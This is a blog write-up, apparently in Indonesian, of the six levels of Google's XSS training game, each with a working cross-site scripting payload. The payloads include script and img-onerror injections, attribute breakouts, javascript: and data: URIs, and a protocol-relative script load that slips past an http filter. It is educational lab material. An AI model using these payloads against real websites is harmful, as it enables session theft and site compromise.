---
layout: post
title: "Writeup XSS Appspot"
description: "Writeup XSS Appspot"
headline: 
modified: 2017-01-31
date: 2017-01-31
category: Web Exploitation
tags: [xss,ctf,web]
imagefeature: /images/xss-appspot.PNG
mathjax: 
chart: 
comments: true
featured: false
---

## Level 1

### Problem

This level demonstrates a common cause of cross-site scripting where user input is directly included in the page without proper escaping. 

Interact with the vulnerable application window below and find a way to make it execute JavaScript of your choosing. You can take actions inside the vulnerable window or directly edit its URL bar.
    
### Solution

parameter query langsung masuk sebagai html jadi kita bisa kirim payload `<script>alert(1)</script>`


## Level 2

### Problem

Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully. 

This level shows how easily XSS bugs can be introduced in complex apps.

### Solution 

Payload `<img src="x" onerror="alert(1)">`


## Level 3

### Problem 

As you've seen in the previous level, some common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood. 

The application on this level is using one such hidden sink.

### Solution 

dari potongan javascript ini 

``` javascript

    <script>
      function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
 
        window.location.hash = num;
 
        // Select the current tab
        var tabs = document.querySelectorAll('.tab');
        for (var i = 0; i < tabs.length; i++) {
          if (tabs[i].id == "tab" + parseInt(num)) {
            tabs[i].className = "tab active";
            } else {
            tabs[i].className = "tab";
          }
        }
 
        // Tell parent we've changed the tab
        top.postMessage(self.location.toString(), "*");
      }
 
      window.onload = function() { 
        chooseTab(self.location.hash.substr(1) || "1");
      }
 
      // Extra code so that we can communicate with the parent page
      window.addEventListener("message", function(event){
        if (event.source == parent) {
          chooseTab(self.location.hash.substr(1));
        }
      }, false);
    </script>
    
```

yang menarik adalah bagian ini `html += "<img src='/static/level3/cloud" + num + ".jpg' />";`
terlihat input kita masuk ke tag img kemudian di tambain " .jpg' "
maka kita bisa kirim payload gambar yang tidak ada , dan kita tambahkan event onerror
payload `' onerror=alert(1) alt='`


## Level 4

### Problem

Every bit of user-supplied data must be correctly escaped for the context of the page in which it will appear. This level shows why.

### Solution

disini fungsi start timer di panggil di dalam onload event dan input kita masuk ke parameter dari fungsi starttime
karena dalam event html kita bisa panggil multiple function jadi kita bisa tambahin function alert pake separator ;
`200');alert(1)` tapi itu belum work sebelum kita kirim pake url encode `200%27%29%3Balert%28%271`

## Level 5

### Problem 

Cross-site scripting isn't just about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM.

### Solution

Input kita di parameter ?next= itu masuk ke dalam tag `<a href="{next}">`
simple kita bisa inject javascriptnya

`javascript:alert(1)`

atau juga bisa pake `data:text/html,<script>alert(1);</script>` yang di urlencode jadi
`data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E`

## Level 6

### Problem

Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash. 

This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.

### Solution

Kita ngak bisa pake protocol http atau https untuk load file nya
karena dia ada cek

``` javascript

if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
      
```

kita host `alert(1)` ke pastebin terus kita load tapi bukan pake http atau https atau protokol lain tapi
pake `//pastebin.com/raw/6aV0qLz3`

read more : [2 Forward slashes](http://stackoverflow.com/questions/9646407/two-forward-slashes-in-a-url-src-href-attribute/9646435#9646435)


![](/images/solve-xss.PNG)